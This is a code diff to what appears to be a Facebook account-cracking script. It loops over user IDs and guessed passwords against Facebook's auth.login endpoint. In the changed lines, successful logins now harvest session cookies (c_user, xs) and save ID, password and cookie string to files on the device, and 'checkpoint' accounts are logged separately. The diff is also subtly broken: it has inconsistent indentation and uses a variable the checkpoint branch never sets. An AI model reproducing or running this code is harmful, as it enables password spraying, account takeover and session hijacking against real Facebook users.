@@ -474,19 +474,23 @@ def _M3_(ids,pasb):
                         'X-FB-HTTP-Engine': 'Liger'}
 
                         url1="https://b-api.facebook.com/method/auth.login"
-                        BLACK=session.post(url1,data=data, headers=head).json()
-                        if 'session_key' in BLACK:
-                                uid = BLACK["uid"]
+                         BLACK=session.cookies.get_dict().keys()
+                        if 'c_user' in BLACK:
+                                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                                uid = re.findall('c_user=(.*);xs', coki)[0]
                                 print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
-                                open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'\n')
+                                print(f"\r\033[38;5;46mCOOKIES=[🤖]: \033[1;37m{coki}\33[1;36m")
+                             #######   print(f'\033[38;5;196m─────────────────────────────────────────────────\033[1;37m')
+                                open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                                 ok.append(uid)
                                 break
-                        elif 'www.facebook.com' in str(BLACK):
-                                uid = BLACK["uid"]
-                                print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
-                                open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'\n')
-                                ok.append(uid)
-                                break
+                        elif 'checkpoint' in BLACK:
+                        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                        	    cid = coki[24:39]
+                        	    print(f'\r\r {R}[ATOM-CP] {uid} | {ps}')
+                        	    open('/sdcard/ATOM-M4-CP.txt','a').write(uid+'|'+ps+'\n')
+                        	    cp.append(cid)
+                        	    break
                         else:continue
                 loop+=1
         except Exception as e:
